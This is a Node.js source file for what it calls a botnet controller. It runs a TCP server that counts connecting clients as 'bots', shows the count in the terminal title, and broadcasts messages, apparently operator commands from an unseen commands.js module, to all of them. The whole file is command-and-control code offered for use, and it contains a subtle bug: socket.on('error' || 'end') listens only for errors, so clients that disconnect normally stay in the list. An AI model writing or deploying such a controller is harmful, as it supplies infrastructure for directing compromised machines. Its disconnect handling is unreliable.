const net = require("net");
const commands = require("./commands.js");
require("dotenv").config({ path: "../config/.env" });

// Keep track of all clients
const clients = [];
let clientInstances = [...clients];
let clientCount = 0;

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
	process.stdout.write(
		String.fromCharCode(27) +
			"]0;" +
			`Botnet | Bots: ${clientCount}` +
			String.fromCharCode(7)
	);
}
setTerminalTitle();

net
	.createServer((socket) => {
		// Identify client
		socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

		// On client connect
		clients.push(socket);

		clientCount++;
		clientInstances = [...clients];
		console.log(`Client ${socket.name} has connected.\n`);

		setTerminalTitle();
		commands.prompt();

		exports.broadcast = function broadcast(message) {
			clientInstances.forEach((client) => {
				client.write(message);
			});
			process.stdout.write("\n" + message);
		};

		function clientDisconnected() {
			clients.splice(clients.indexOf(socket), 1);
			clientCount--;
			clientInstances = [...clients];
			console.log(`Client ${socket.name} has disconnected.\n`);
			if (clientCount < 1) console.log("Waiting for clients to connect.\n");
			setTerminalTitle();
		}

		socket.on("data", (data) => {
			exports.broadcast(`[CLIENT ${socket.name}] ` + data, socket);
			commands.prompt();
		});

		socket.on("error" || "end", () => {
			clientDisconnected();
		});
	})
	.listen(PORT, HOST);

console.log(`Server running on ${HOST}:${PORT}.`);
console.log(`Waiting for connections.\n`);
